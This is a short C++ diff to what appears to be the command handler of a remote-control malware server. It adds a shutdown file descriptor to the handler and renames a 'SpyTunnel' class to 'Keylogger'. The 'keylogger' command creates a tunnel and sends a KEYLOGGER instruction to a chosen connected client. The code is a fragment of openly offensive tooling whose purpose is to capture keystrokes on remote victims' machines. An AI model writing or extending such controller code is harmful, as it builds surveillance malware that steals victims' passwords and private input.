@@ -68,7 +68,9 @@ CommandHandler::CommandHandler(
     std::atomic<bool>* __p_shutdown_flag,
     std::string* __p_ip,
     uint* __p_port,
-    int* __p_user_verbosity): p_ip_(__p_ip),p_port_(__p_port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity) {
+    int* __p_user_verbosity,
+    int __shutdown_event_fd): p_ip_(__p_ip),p_port_(__p_port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), shutdown_event_fd_(__shutdown_event_fd) {
+    
 
     argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
     argument_list_.push_back(Argument(ALL_ARG, ARG_TYPE_SET, "-a", "--all"));
@@ -347,14 +349,16 @@ void CommandHandler::kill() {
 
 void CommandHandler::keylogger() {
     int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
-    SpyTunnel* keylogger = new SpyTunnel(
+    Keylogger* keylogger = new Keylogger(
         p_ip_,
         p_port_,
         client_index,
         p_shutdown_flag_,
-        TCP_BASED
+        TCP_BASED,
+        shutdown_event_fd_,
+        &tunnel_shutdown_fds_
     );
-    spy_tunnels_.emplace_back(keylogger);
+    p_clients_->at(client_index)->set_tunnel(KEYLOGGER);
     send_client(KEYLOGGER, 0, client_index);
 }
 
